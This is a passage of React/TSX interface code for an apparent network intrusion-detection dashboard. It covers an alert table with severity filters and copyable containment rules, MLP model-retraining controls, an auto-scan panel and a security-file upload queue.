                        <Search className="w-3.5 h-3.5 absolute left-3 top-1/2 -translate-y-1/2 text-slate-400" />
                        <input
                          type="text"
                          value={rawTableSearch}
                          onChange={e => setRawTableSearch(e.target.value)}
                          placeholder="Search IP, port, attack..."
                          className="pl-8 pr-3 py-1.5 rounded-xl bg-slate-950 border border-slate-800 text-xs text-white placeholder-slate-500 focus:outline-none focus:border-cyan-500 font-mono w-48"
                        />
                      </div>

                      <button
                        type="button"
                        onClick={() => setRawTableFilter('all')}
                        className={`px-3 py-1.5 rounded-xl text-xs font-bold transition-all ${
                          rawTableFilter === 'all'
                            ? 'bg-cyan-500/20 text-cyan-300 border border-cyan-500/50'
                            : 'bg-slate-950 text-slate-400 hover:text-white border border-slate-800'
                        }`}
                      >
                        All Traffic ({rawAnalysisResult.alerts.length})
                      </button>

                      <button
                        type="button"
                        onClick={() => setRawTableFilter('threats')}
                        className={`px-3 py-1.5 rounded-xl text-xs font-bold transition-all ${
                          rawTableFilter === 'threats'
                            ? 'bg-red-500/20 text-red-300 border border-red-500/50'
                            : 'bg-slate-950 text-slate-400 hover:text-white border border-slate-800'
                        }`}
                      >
                        Threats ({critCount})
                      </button>

                      <button
                        type="button"
                        onClick={() => setRawTableFilter('critical')}
                        className={`px-3 py-1.5 rounded-xl text-xs font-bold transition-all ${
                          rawTableFilter === 'critical'
                            ? 'bg-orange-500/20 text-orange-300 border border-orange-500/50'
                            : 'bg-slate-950 text-slate-400 hover:text-white border border-slate-800'
                        }`}
                      >
                        Critical Only ({rawAnalysisResult.alerts.filter(a => a.severity === 'CRITICAL').length})
                      </button>

                      <button
                        type="button"
                        onClick={handleExportRawTrafficTxt}
                        className="px-3 py-1.5 rounded-xl text-xs font-bold bg-slate-950 text-emerald-400 hover:text-white border border-emerald-500/40 hover:border-emerald-400 transition-all flex items-center gap-1.5 shadow-sm"
                        title="Download all traffic records in plain text"
                      >
                        <FileText className="w-3.5 h-3.5" /> Export Plain Text (.TXT)
                      </button>
                    </div>
                  </div>

                  {/* High-Density Traffic Table */}
                  <div className="overflow-x-auto max-h-[550px]">
                    <table className="w-full text-left text-xs">
                      <thead className="bg-slate-950/90 text-slate-400 font-mono uppercase text-[10px] tracking-wider border-b border-slate-800 sticky top-0 z-10 backdrop-blur-md">
                        <tr>
                          <th className="py-3 px-4">#</th>
                          <th className="py-3 px-4">Source (Attacker)</th>
                          <th className="py-3 px-4">Target (Destination)</th>
                          <th className="py-3 px-4">Port / Proto</th>
                          <th className="py-3 px-4">Service</th>
                          <th className="py-3 px-4">Threat Classification</th>
                          <th className="py-3 px-4">MITRE Technique</th>
                          <th className="py-3 px-4 text-center">Risk Score</th>
                          <th className="py-3 px-4 text-center">Severity</th>
                          <th className="py-3 px-4 text-right">Action</th>
                        </tr>
                      </thead>
                      <tbody className="divide-y divide-slate-800/60 font-mono">
                        {displayedAlerts.map((alert, idx) => {
                          const alertKey = alert.id || alert.alert_id || String(idx);
                          const isExpanded = expandedAlertId === alertKey;

                          return (
                            <React.Fragment key={alertKey}>
                              <tr
                                onClick={() => setExpandedAlertId(isExpanded ? null : alertKey)}
                                className={`hover:bg-slate-800/40 cursor-pointer transition-colors ${
                                  isExpanded ? 'bg-slate-800/30' : ''
                                }`}
                              >
                                <td className="py-3 px-4 text-slate-500">{idx + 1}</td>
                                <td className="py-3 px-4 font-bold text-cyan-300">
                                  {alert.source_ip}:{alert.source_port || '*'}
                                </td>
                                <td className="py-3 px-4 font-bold text-amber-300">
                                  {alert.destination_ip}:{alert.destination_port || '*'}
                                </td>
                                <td className="py-3 px-4 text-purple-300">
                                  {alert.destination_port}/{alert.protocol || 'TCP'}
                                </td>
                                <td className="py-3 px-4 text-slate-300 font-sans font-medium">
                                  {alert.service || 'Unknown'}
                                </td>
                                <td className="py-3 px-4 font-sans font-bold text-white max-w-xs truncate">
                                  {alert.attack_type || alert.threat_title}
                                </td>
                                <td className="py-3 px-4 text-indigo-300 text-[11px] truncate max-w-xs">
                                  {alert.mitre_technique}
                                </td>
                                <td className="py-3 px-4 text-center">
                                  <span className="font-bold text-amber-400">
                                    {alert.risk_score}
                                  </span>
                                  <span className="text-[10px] text-slate-500">/100</span>
                                </td>
                                <td className="py-3 px-4 text-center">
                                  <span className={`px-2 py-0.5 rounded text-[10px] font-black uppercase ${
                                    alert.severity === 'CRITICAL' ? 'bg-red-500/20 text-red-400 border border-red-500/40' :
                                    alert.severity === 'HIGH' ? 'bg-orange-500/20 text-orange-400 border border-orange-500/40' :
                                    'bg-yellow-500/20 text-yellow-400 border border-yellow-500/40'
                                  }`}>
                                    {alert.severity}
                                  </span>
                                </td>
                                <td className="py-3 px-4 text-right">
                                  <button
                                    type="button"
                                    onClick={(e) => {
                                      e.stopPropagation();
                                      handleCopyCommand(alert.containment_command, alertKey);
                                    }}
                                    className="px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-cyan-300 text-[10px] font-bold transition-all inline-flex items-center gap-1 border border-white/5"
                                  >
                                    {copiedCommand === alertKey ? (
                                      <>
                                        <Check className="w-3 h-3 text-emerald-400" />
                                        <span className="text-emerald-400">DONE</span>
                                      </>
                                    ) : (
                                      <>
                                        <Copy className="w-3 h-3" />
                                        <span>RULE</span>
                                      </>
                                    )}
                                  </button>
                                </td>
                              </tr>

                              {/* Expandable Details Row */}
                              {isExpanded && (
                                <tr className="bg-slate-950/90 border-b border-slate-800">
                                  <td colSpan={10} className="p-4 space-y-3 font-sans">
                                    <div className="text-xs font-bold text-white uppercase tracking-wider flex items-center gap-2">
                                      <Info className="w-4 h-4 text-cyan-400" />
                                      Detailed Telemetry Evidence & Tactical SOC Response:
                                    </div>

                                    {/* Containment Command */}
                                    <div className="p-3 rounded-xl bg-slate-900 border border-slate-800 font-mono text-xs flex items-center justify-between gap-3">
                                      <div className="truncate">
                                        <span className="text-slate-400 mr-2 text-[10px] uppercase font-bold">SOAR Command:</span>
                                        <code className="text-emerald-400">{alert.containment_command}</code>
                                      </div>
                                      <button
                                        type="button"
                                        onClick={() => handleCopyCommand(alert.containment_command, alertKey + '_exp')}
                                        className="px-3 py-1 rounded bg-slate-800 hover:bg-slate-700 text-white text-xs font-bold shrink-0 flex items-center gap-1.5"
                                      >
                                        <Copy className="w-3 h-3" /> Copy
                                      </button>
                                    </div>

                                    {/* Vulnerability & Evidence */}
                                    {alert.evidence && alert.evidence.length > 0 && (
                                      <div className="space-y-1">
                                        <span className="text-[11px] font-bold text-slate-400 uppercase">Detection Evidence:</span>
                                        <div className="space-y-1 font-mono text-xs text-slate-300">
                                          {alert.evidence.map((ev: string, i: number) => (
                                            <div key={i} className="p-2 rounded bg-slate-900/60 border border-slate-800/80">
                                              • {ev}
                                            </div>
                                          ))}
                                        </div>
                                      </div>
                                    )}

                                    {/* CVE / Security Note */}
                                    {alert.cve_note && (
                                      <div className="p-2.5 rounded-lg bg-red-950/20 border border-red-500/30 text-xs text-red-300">
                                        <strong className="text-red-400">Exploitability Assessment:</strong> {alert.cve_note}
                                      </div>
                                    )}
                                  </td>
                                </tr>
                              )}
                            </React.Fragment>
                          );
                        })}
                      </tbody>
                    </table>
                  </div>
                </div>
              </div>
            );
          })()}

          {/* BIG DATA MODEL RETRAINING ENGINE PANEL */}
          <div className="bg-gradient-to-br from-slate-900 via-indigo-950/30 to-slate-900 border border-indigo-500/30 rounded-2xl p-6 shadow-2xl space-y-5">
            <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-4">
              <div className="flex items-center gap-3">
                <div className="p-3 bg-indigo-500/15 border border-indigo-500/30 rounded-xl text-indigo-400">
                  <Brain className="w-7 h-7 animate-pulse" />
                </div>
                <div>
                  <h3 className="text-base font-black text-white uppercase tracking-wider flex items-center gap-2">
                    Big Data Model Retraining Engine (Apache Spark + MLP)
                    <span className="text-[10px] font-bold px-2 py-0.5 rounded-full bg-indigo-500/20 text-indigo-300 border border-indigo-500/40">
                      SPARK 3.X BIG DATA
                    </span>
                  </h3>
                  <p className="text-xs text-slate-400 mt-0.5">
                    Retrain the 3-Layer MLP Neural Network (128→64→32 ReLU) on the Big Data storage repository (CIC-IDS 2017/2018 + UNSW-NB15) to update weights, discover newly emerging attack vectors, and optimize classification accuracy.
                  </p>
                </div>
              </div>

              <div className="flex flex-wrap items-center gap-2 shrink-0">
                <span className="px-3 py-1 rounded-lg bg-slate-950 border border-slate-800 text-xs font-mono text-slate-300">
                  Spark: <strong className="text-cyan-400">{sparkStatus?.status || 'ONLINE'}</strong>
                </span>
                <span className="px-3 py-1 rounded-lg bg-slate-950 border border-slate-800 text-xs font-mono text-slate-300">
                  Datasets: <strong className="text-purple-400">{datasets?.total_discovered || 3} Files</strong>
                </span>
                <span className="px-3 py-1 rounded-lg bg-slate-950 border border-slate-800 text-xs font-mono text-slate-300">
                  Acc: <strong className="text-emerald-400">
                    {trainingStatus?.network_metrics?.test_metrics?.accuracy
                      ? `${(trainingStatus.network_metrics.test_metrics.accuracy * 100).toFixed(1)}%`
                      : '89.9%'}
                  </strong>
                </span>
              </div>
            </div>

            {/* Retraining Mode Selector */}
            <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
              <button
                type="button"
                onClick={() => setTrainMode('all')}
                className={`p-3.5 rounded-xl border text-left transition-all ${
                  trainMode === 'all'
                    ? 'bg-indigo-600/20 border-indigo-500/60 shadow-[0_0_15px_rgba(99,102,241,0.25)]'
                    : 'bg-slate-950/60 border-slate-800 hover:border-slate-700'
                }`}
              >
                <div className="text-xs font-bold text-white flex items-center justify-between">
                  <span>Full Multi-Modal Training</span>
                  {trainMode === 'all' && <CheckCircle className="w-4 h-4 text-indigo-400" />}
                </div>
                <div className="text-[11px] text-slate-400 mt-1">
                  Trains on both Network Flow PCAP/CSV and Windows Event Log datasets.
                </div>
              </button>

              <button
                type="button"
                onClick={() => setTrainMode('network')}
                className={`p-3.5 rounded-xl border text-left transition-all ${
                  trainMode === 'network'
                    ? 'bg-cyan-600/20 border-cyan-500/60 shadow-[0_0_15px_rgba(6,182,212,0.25)]'
                    : 'bg-slate-950/60 border-slate-800 hover:border-slate-700'
                }`}
              >
                <div className="text-xs font-bold text-white flex items-center justify-between">
                  <span>Network Telemetry Only</span>
                  {trainMode === 'network' && <CheckCircle className="w-4 h-4 text-cyan-400" />}
                </div>
                <div className="text-[11px] text-slate-400 mt-1">
                  Trains 19-feature MLP on CIC-IDS 2017/2018 + UNSW-NB15 flows.
                </div>
              </button>

              <button
                type="button"
                onClick={() => setTrainMode('windows_log')}
                className={`p-3.5 rounded-xl border text-left transition-all ${
                  trainMode === 'windows_log'
                    ? 'bg-purple-600/20 border-purple-500/60 shadow-[0_0_15px_rgba(168,85,247,0.25)]'
                    : 'bg-slate-950/60 border-slate-800 hover:border-slate-700'
                }`}
              >
                <div className="text-xs font-bold text-white flex items-center justify-between">
                  <span>Windows Logs (Splunk / EVTX)</span>
                  {trainMode === 'windows_log' && <CheckCircle className="w-4 h-4 text-purple-400" />}
                </div>
                <div className="text-[11px] text-slate-400 mt-1">
                  Trains log parser on EventCodes 4625, 4688, 1102, 4720.
                </div>
              </button>
            </div>

            {/* Training Status / Feedback Message */}
            {trainingMessage && (
              <div className="p-3.5 rounded-xl bg-indigo-950/50 border border-indigo-500/40 text-indigo-300 text-xs font-mono flex items-center gap-2">
                <Sparkles className="w-4 h-4 text-indigo-400 animate-spin" />
                <span>{trainingMessage}</span>
              </div>
            )}

            {trainingError && (
              <div className="p-3.5 rounded-xl bg-red-950/40 border border-red-500/40 text-red-300 text-xs flex items-center gap-2">
                <AlertTriangle className="w-4 h-4 text-red-400" />
                <span>{trainingError}</span>
              </div>
            )}

            {/* Retrain Action Button */}
            <div className="flex flex-col sm:flex-row items-center justify-between gap-4 pt-2">
              <div className="text-xs text-slate-400 font-mono">
                Architecture: 19 Inputs → 128 ReLU → 64 ReLU → 32 ReLU → Softmax (9 Classes)
              </div>

              <button
                type="button"
                onClick={handleTrainMlp}
                disabled={isTrainingMlp}
                className={`w-full sm:w-auto px-7 py-3 rounded-xl font-heading text-xs font-black uppercase tracking-wider flex items-center justify-center gap-2 transition-all shadow-xl ${
                  isTrainingMlp
                    ? 'bg-slate-800 text-slate-500 cursor-not-allowed border border-white/5'
                    : 'bg-gradient-to-r from-indigo-600 via-purple-600 to-indigo-600 hover:from-indigo-500 hover:to-purple-500 text-white shadow-[0_0_20px_rgba(99,102,241,0.35)] border border-indigo-400/30'
                }`}
              >
                {isTrainingMlp ? (
                  <>
                    <RefreshCw className="w-4 h-4 animate-spin text-white" />
                    TRAINING BIG DATA MODEL...
                  </>
                ) : (
                  <>
                    <Cpu className="w-4 h-4 text-cyan-300" />
                    🚀 TRAIN / RETRAIN BIG DATA MODEL
                  </>
                )}
              </button>
            </div>
          </div>
        </div>
      )}

      {/* ═══════════════════════════════════════════════════════════════ */}
      {/* TAB 1: SECURITY DATA ANALYZER & MULTI-FORMAT SCANNER           */}
      {/* ═══════════════════════════════════════════════════════════════ */}
      {activeTab === 'scanner' && (
        <div className="space-y-6">


          {/* ═══════════════════════════════════════════════════════════════ */}
          {/* SECTION 1: AUTO-SCAN HERO PANEL (PRIMARY - NO UPLOAD NEEDED)  */}
          {/* ═══════════════════════════════════════════════════════════════ */}
          <div className="relative overflow-hidden bg-gradient-to-br from-slate-900 via-indigo-950/40 to-slate-900 border border-indigo-500/30 rounded-2xl p-6 shadow-2xl space-y-5">
            {/* Ambient glow */}
            <div className="absolute inset-0 bg-gradient-to-r from-cyan-500/5 via-indigo-500/5 to-purple-500/5 pointer-events-none" />
            <div className="absolute -top-10 -right-10 w-48 h-48 bg-indigo-500/10 rounded-full blur-3xl pointer-events-none" />

            {/* Header */}
            <div className="relative flex flex-col md:flex-row items-start md:items-center justify-between gap-4">
              <div className="flex items-center gap-3">
                <div className="p-3 bg-indigo-500/15 border border-indigo-500/30 rounded-xl">
                  <Brain className="w-7 h-7 text-indigo-400 animate-pulse" />
                </div>
                <div>
                  <h2 className="text-lg font-black text-white uppercase tracking-wider flex items-center gap-2">
                    Auto-Scan with Pre-Trained Model
                    <span className="text-[10px] font-bold px-2 py-0.5 rounded-full bg-emerald-500/15 text-emerald-400 border border-emerald-500/30">
                      NO UPLOAD REQUIRED
                    </span>
                  </h2>
                  <p className="text-xs text-slate-400 mt-0.5">
                    Uses the 3-Layer MLP (128→64→32) trained on CIC-IDS 2017/2018 + UNSW-NB15. Injects synthetic decoys to obfuscate real asset fingerprints.
                  </p>
                </div>
              </div>

              {/* Badges */}
              <div className="relative flex flex-wrap gap-2 shrink-0">
                <span className="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-cyan-500/10 border border-cyan-500/25 text-[11px] font-semibold text-cyan-400">
                  <Cpu className="w-3.5 h-3.5" /> MLP Neural Net
                </span>
                <span className="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-purple-500/10 border border-purple-500/25 text-[11px] font-semibold text-purple-400">
                  <Layers className="w-3.5 h-3.5" /> Apache Spark
                </span>
                <span className="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-amber-500/10 border border-amber-500/25 text-[11px] font-semibold text-amber-400">
                  <Sparkles className="w-3.5 h-3.5" /> Decoy Injection
                </span>
              </div>
            </div>

            {/* Config Row */}
            <div className="relative grid grid-cols-1 md:grid-cols-3 gap-4">
              {/* Scan Mode */}
              <div className="bg-slate-950/70 border border-slate-800 rounded-xl p-4 space-y-2">
                <label className="text-xs font-bold text-slate-400 uppercase tracking-wider flex items-center gap-1.5">
                  <Database className="w-3.5 h-3.5 text-cyan-400" /> Dataset Mode
                </label>
                <select
                  value={autoScanMode}
                  onChange={e => setAutoScanMode(e.target.value as any)}
                  disabled={isAutoScanning}
                  className="w-full bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-xs text-slate-100 focus:outline-none focus:border-indigo-500 disabled:opacity-50"
                >
                  <option value="all">All Datasets (Network + Logs)</option>
                  <option value="network">Network Flow Datasets Only</option>
                  <option value="logs">Security Log Datasets Only</option>
                </select>
              </div>

              {/* Decoy Injection */}
              <div className="bg-slate-950/70 border border-slate-800 rounded-xl p-4 space-y-2">
                <label className="text-xs font-bold text-slate-400 uppercase tracking-wider flex items-center gap-1.5">
                  <Shield className="w-3.5 h-3.5 text-amber-400" /> Synthetic Decoy Injection
                </label>
                <div className="flex items-center gap-3">
                  <button
                    onClick={() => setAutoScanDecoys(true)}
                    disabled={isAutoScanning}
                    className={`flex-1 py-2 rounded-lg text-xs font-bold transition-all ${
                      autoScanDecoys
                        ? 'bg-amber-500/20 border border-amber-500/50 text-amber-300'
                        : 'bg-slate-900 border border-slate-700 text-slate-400 hover:border-amber-500/30'
                    }`}
                  >
                    ✦ ENABLED
                  </button>
                  <button
                    onClick={() => setAutoScanDecoys(false)}
                    disabled={isAutoScanning}
                    className={`flex-1 py-2 rounded-lg text-xs font-bold transition-all ${
                      !autoScanDecoys
                        ? 'bg-slate-700 border border-slate-500 text-slate-200'
                        : 'bg-slate-900 border border-slate-700 text-slate-400 hover:border-slate-500/50'
                    }`}
                  >
                    DISABLED
                  </button>
                </div>
              </div>

              {/* Dataset Info */}
              <div className="bg-slate-950/70 border border-slate-800 rounded-xl p-4 space-y-2">
                <label className="text-xs font-bold text-slate-400 uppercase tracking-wider flex items-center gap-1.5">
                  <BarChart3 className="w-3.5 h-3.5 text-indigo-400" /> Loaded Datasets
                </label>
                <div className="space-y-1">
                  <div className="text-lg font-black text-white">
                    {datasets?.compatible_count ?? '—'}
                    <span className="text-xs font-normal text-slate-400 ml-1">compatible files</span>
                  </div>
                  <div className="text-[11px] text-slate-500">
                    {datasets?.total_discovered ?? '?'} total discovered • Auto-scan uses samples & logs
                  </div>
                </div>
              </div>
            </div>

            {/* Feature Chips */}
            <div className="relative flex flex-wrap gap-2">
              {[
                '3-Layer MLP (128→64→32)', 'CIC-IDS 2017/2018', 'UNSW-NB15', 'KDD-99',
                '19-Feature Canonical Schema', '0–100 Risk Engine', 'MITRE ATT&CK Mapping',
                autoScanDecoys ? 'Synthetic Decoy Obfuscation' : 'No Decoys'
              ].map(feat => (
                <span key={feat} className="text-[11px] px-2 py-1 rounded-md bg-slate-800/80 border border-slate-700/60 text-slate-400 font-mono">
                  {feat}
                </span>
              ))}
            </div>

            {/* CTA Button */}
            <div className="relative">
              <button
                id="auto-scan-btn"
                onClick={handleAutoScan}
                disabled={isAutoScanning || isScanning}
                className={`w-full flex items-center justify-center gap-3 py-4 rounded-xl font-black text-sm uppercase tracking-widest shadow-2xl transition-all duration-200 ${
                  isAutoScanning
                    ? 'bg-indigo-900/60 border border-indigo-500/30 text-indigo-300 cursor-not-allowed'
                    : 'bg-gradient-to-r from-indigo-600 via-purple-600 to-indigo-600 hover:from-indigo-500 hover:via-purple-500 hover:to-indigo-500 text-white shadow-indigo-500/30 hover:shadow-indigo-500/50 hover:scale-[1.01]'
                }`}
              >
                {isAutoScanning ? (
                  <>
                    <RefreshCw className="w-5 h-5 animate-spin" />
                    Running Auto-Scan — Pre-Trained MLP Active...
                  </>
                ) : (
                  <>
                    <Zap className="w-5 h-5" />
                    Launch Auto-Scan with Pre-Trained Model
                    <ArrowRight className="w-5 h-5" />
                  </>
                )}
              </button>
            </div>

            {/* Auto-scan error */}
            {autoScanError && (
              <div className="relative p-4 bg-red-500/10 border border-red-500/30 rounded-xl text-xs text-red-300 flex items-start gap-3">
                <AlertTriangle className="w-4 h-4 shrink-0 mt-0.5" />
                <div><span className="font-bold">Auto-Scan Error: </span>{autoScanError}</div>
              </div>
            )}
          </div>

          {/* ═══════════════════════════════════════════════════════════════ */}
          {/* SECTION 1B: MANUAL FILE UPLOAD (SECONDARY / COLLAPSIBLE)     */}
          {/* ═══════════════════════════════════════════════════════════════ */}
          <div className="bg-slate-900/80 border border-slate-800 rounded-2xl overflow-hidden shadow-xl">
            <button
              onClick={() => setShowUploadPanel(p => !p)}
              className="w-full flex items-center justify-between px-6 py-4 hover:bg-slate-800/40 transition-colors"
            >
              <div className="flex items-center gap-3">
                <UploadCloud className="w-5 h-5 text-slate-400" />
                <span className="text-sm font-bold text-slate-300 uppercase tracking-wider">
                  Manual File Upload
                </span>
                <span className="text-[11px] px-2 py-0.5 rounded-full bg-slate-800 border border-slate-700 text-slate-500">Secondary</span>
              </div>
              <ChevronRight className={`w-4 h-4 text-slate-500 transition-transform ${showUploadPanel ? 'rotate-90' : ''}`} />
            </button>

            {showUploadPanel && (
              <div className="px-6 pb-6 space-y-5 border-t border-slate-800">
                <div className="flex items-center gap-2 pt-4 w-full md:w-auto">
                  <select
                    value={selectedSamplePath}
                    onChange={e => {
                      setSelectedSamplePath(e.target.value);
                      if (e.target.value) handleAddSampleFile(e.target.value);
                    }}
                    className="bg-slate-950 border border-slate-700 rounded-xl px-3 py-2 text-xs text-slate-200 focus:outline-none focus:border-red-500"
                  >
                    <option value="">-- Or Select Sample Dataset --</option>
                    {sampleFiles.map(s => (
                      <option key={s.path} value={s.path}>
                        {s.name} ({s.size_kb} KB)
                      </option>
                    ))}
                  </select>
                </div>

                {/* Drag and Drop Zone */}
                <div
                  onClick={() => fileInputRef.current?.click()}
                  onDragOver={e => e.preventDefault()}
                  onDrop={e => {
                    e.preventDefault();
                    if (e.dataTransfer.files && e.dataTransfer.files.length > 0) {
                      const event = { target: { files: e.dataTransfer.files } } as any;
                      handleFileUpload(event);
                    }
                  }}
                  className="border-2 border-dashed border-slate-700 hover:border-red-500/80 bg-slate-950/60 hover:bg-slate-950/90 transition-all rounded-2xl p-7 text-center cursor-pointer group"
                >
                  <input
                    ref={fileInputRef}
                    type="file"
                    multiple
                    accept=".csv,.tsv,.json,.jsonl,.ndjson,.pcap,.pcapng,.cap,.log,.txt,.xml,.evtx,.parquet,.xlsx"
                    onChange={handleFileUpload}
                    className="hidden"
                  />
                  <div className="w-14 h-14 bg-red-500/10 group-hover:bg-red-500/20 text-red-400 rounded-2xl flex items-center justify-center mx-auto mb-3 transition-all">
                    <UploadCloud className="w-7 h-7" />
                  </div>
                  <h3 className="text-sm font-bold text-white mb-1">
                    Drag & Drop Security Files, or <span className="text-red-400 underline">Browse</span>
                  </h3>
                  <p className="text-xs text-slate-400 font-mono tracking-wide mb-2">
                    CSV • JSON • JSONL • PCAP • PCAPNG • LOG • TXT • XML • EVTX
                  </p>
                </div>

                {/* Uploaded Files Queue */}
                {fileQueue.length > 0 && (
                  <div className="space-y-3">
                    <div className="flex items-center justify-between">
                      <h4 className="text-xs font-bold text-slate-300 uppercase tracking-wider flex items-center gap-2">
                        <FolderOpen className="w-4 h-4 text-cyan-400" />
                        Files Queued ({fileQueue.length})
                      </h4>
                      <button onClick={handleClearQueue} className="text-xs text-slate-400 hover:text-red-400 transition-colors">Clear All</button>
                    </div>
                    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
                      {fileQueue.map((file, idx) => (
                        <div key={idx} className="bg-slate-950 border border-slate-800 rounded-xl p-3.5 flex items-center justify-between gap-3">
                          <div className="flex items-center gap-3 overflow-hidden">
                            <div className="p-2 bg-slate-900 rounded-lg">
                              <FileCode className="w-4 h-4 text-indigo-400" />
                            </div>
                            <div className="overflow-hidden">
                              <div className="text-xs font-semibold text-white truncate">{file.filename}</div>
                              <div className="text-[11px] text-slate-400 flex gap-2 mt-0.5">
                                <span className="text-cyan-400 font-mono">{file.file_type}</span>
                                <span>{file.size_human}</span>
                              </div>
                            </div>
                          </div>
                          <button onClick={() => handleRemoveFile(idx)} className="p-1.5 text-slate-500 hover:text-red-400 hover:bg-slate-900 rounded-lg transition-colors">
                            <Trash2 className="w-4 h-4" />
                          </button>
                        </div>
                      ))}
                    </div>
                    <div className="flex justify-end pt-1">
                      <button
                        onClick={handleStartScan}
                        disabled={isScanning}
                        className={`flex items-center gap-2 px-7 py-3 rounded-xl font-bold text-sm uppercase tracking-wider text-white shadow-xl transition-all ${
                          isScanning
                            ? 'bg-slate-800 cursor-not-allowed text-slate-500'
                            : 'bg-gradient-to-r from-red-600 to-rose-600 hover:from-red-500 hover:to-rose-500 shadow-red-600/30 hover:scale-[1.02]'
                        }`}
                      >
                        <Play className={`w-4 h-4 ${isScanning ? 'animate-spin' : ''}`} />
                        {isScanning ? 'SCANNING...' : 'START SECURITY SCAN'}
                      </button>
                    </div>
                  </div>
                )}

                {uploadError && (
                  <div className="p-3 bg-red-500/10 border border-red-500/30 rounded-xl text-xs text-red-400 flex items-start gap-2">
                    <AlertTriangle className="w-4 h-4 shrink-0" />
                    <div><span className="font-bold">Upload Error: </span>{uploadError}</div>
                  </div>
                )}
              </div>
            )}
          </div>

          {/* SECTION 2: REAL-TIME SCAN PROGRESS */}
          {(isScanning || isAutoScanning) && (
            <div className={`border rounded-2xl p-6 shadow-xl space-y-4 animate-pulse ${
              isAutoScanning
                ? 'bg-slate-900/90 border-indigo-500/40'
                : 'bg-slate-900/90 border-red-500/40'
            }`}>
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <Cpu className={`w-5 h-5 animate-spin ${isAutoScanning ? 'text-indigo-400' : 'text-red-400'}`} />
                  <span className="text-sm font-bold text-white tracking-wide uppercase">
                    {isAutoScanning ? 'Auto-Scan — Pre-Trained MLP Active' : 'Security Scan In Progress'}
                  </span>
                </div>
                <span className={`text-sm font-mono font-bold ${isAutoScanning ? 'text-indigo-400' : 'text-red-400'}`}>{scanProgressPct}%</span>
              </div>

              {/* Progress Bar */}
              <div className="w-full h-3 bg-slate-950 rounded-full overflow-hidden border border-slate-800">
                <div
                  className={`h-full transition-all duration-300 rounded-full ${
                    isAutoScanning
                      ? 'bg-gradient-to-r from-indigo-500 via-purple-500 to-cyan-500'
                      : 'bg-gradient-to-r from-red-500 via-rose-500 to-amber-500'
                  }`}
                  style={{ width: `${scanProgressPct}%` }}
                />
              </div>

              <div className="flex items-center justify-between text-xs text-slate-400">
                <span className="font-mono text-cyan-400">{scanProgressStage}</span>
                <span className="font-mono">Processing Stage</span>
              </div>
            </div>
          )}

          {/* SECTION 3: SCAN SUMMARY METRICS */}
          {scanResult && (
            <div className="space-y-6">
              {/* Top KPI Cards */}
              <div className="grid grid-cols-2 sm:grid-cols-4 lg:grid-cols-7 gap-3">
                <div className="bg-slate-900/90 border border-slate-800 p-4 rounded-xl">
                  <div className="text-[11px] font-bold text-slate-400 uppercase tracking-wider">Total Records</div>
                  <div className="text-xl font-black text-white mt-1">
                    {scanResult.summary.total_records.toLocaleString()}
                  </div>
                  <div className="text-[10px] text-cyan-400 mt-0.5">Spark Ingested</div>
                </div>

                <div className="bg-slate-900/90 border border-slate-800 p-4 rounded-xl">
                  <div className="text-[11px] font-bold text-slate-400 uppercase tracking-wider">Total Alerts</div>
                  <div className="text-xl font-black text-amber-400 mt-1">
                    {scanResult.summary.total_alerts.toLocaleString()}
                  </div>
                  <div className="text-[10px] text-slate-400 mt-0.5">Threats Detected</div>
                </div>

                <div className="bg-slate-900/90 border border-red-500/30 p-4 rounded-xl bg-red-950/10">
                  <div className="text-[11px] font-bold text-red-400 uppercase tracking-wider">Critical (75-100)</div>
                  <div className="text-xl font-black text-red-400 mt-1">
                    {scanResult.summary.summary.critical}
                  </div>
                  <div className="text-[10px] text-red-500/80 mt-0.5">Immediate Triage</div>
                </div>

                <div className="bg-slate-900/90 border border-orange-500/30 p-4 rounded-xl bg-orange-950/10">
                  <div className="text-[11px] font-bold text-orange-400 uppercase tracking-wider">High (50-74)</div>
                  <div className="text-xl font-black text-orange-400 mt-1">
                    {scanResult.summary.summary.high}
                  </div>
                  <div className="text-[10px] text-orange-500/80 mt-0.5">High Priority</div>
                </div>

                <div className="bg-slate-900/90 border border-yellow-500/30 p-4 rounded-xl bg-yellow-950/10">
                  <div className="text-[11px] font-bold text-yellow-400 uppercase tracking-wider">Medium (25-49)</div>
                  <div className="text-xl font-black text-yellow-400 mt-1">
                    {scanResult.summary.summary.medium}
                  </div>
                  <div className="text-[10px] text-yellow-500/80 mt-0.5">Suspicious Flows</div>
                </div>

                <div className="bg-slate-900/90 border border-emerald-500/30 p-4 rounded-xl bg-emerald-950/10">
                  <div className="text-[11px] font-bold text-emerald-400 uppercase tracking-wider">Normal (0-24)</div>
                  <div className="text-xl font-black text-emerald-400 mt-1">
                    {scanResult.summary.summary.normal}
                  </div>
                  <div className="text-[10px] text-emerald-500/80 mt-0.5">Benign Baseline</div>
                </div>

                <div className="bg-slate-900/90 border border-slate-800 p-4 rounded-xl">
                  <div className="text-[11px] font-bold text-slate-400 uppercase tracking-wider">Avg Risk Score</div>
                  <div className="text-xl font-black text-indigo-400 mt-1">
                    {scanResult.summary.summary.avg_risk_score} <span className="text-xs text-slate-500">/ 100</span>
                  </div>
                  <div className="text-[10px] text-slate-400 mt-0.5">MLP Conf: {scanResult.summary.summary.avg_confidence}%</div>
                </div>
              </div>

              {/* SECTION 4: SEARCH, ADVANCED FILTERS & EXPORT */}
              <div className="bg-slate-900/90 border border-slate-800 rounded-2xl p-6 shadow-xl space-y-4">
                <div className="flex flex-col lg:flex-row items-stretch lg:items-center justify-between gap-4">
                  {/* Search Bar */}
                  <div className="relative flex-1">
                    <Search className="w-4 h-4 text-slate-400 absolute left-3.5 top-1/2 -translate-y-1/2" />
                    <input
                      type="text"
                      placeholder="🔎 Search scan results (IP, Attack Type, Port, Protocol, MITRE ATT&CK, Source File)..."
                      value={searchQuery}
                      onChange={e => setSearchQuery(e.target.value)}
                      className="w-full bg-slate-950 border border-slate-700 rounded-xl pl-10 pr-4 py-2.5 text-xs text-slate-200 placeholder-slate-500 focus:outline-none focus:border-red-500"
                    />
                  </div>

                  {/* Export Buttons */}
                  <div className="flex items-center gap-2 shrink-0">
                    <button
                      onClick={() => handleExport('csv')}
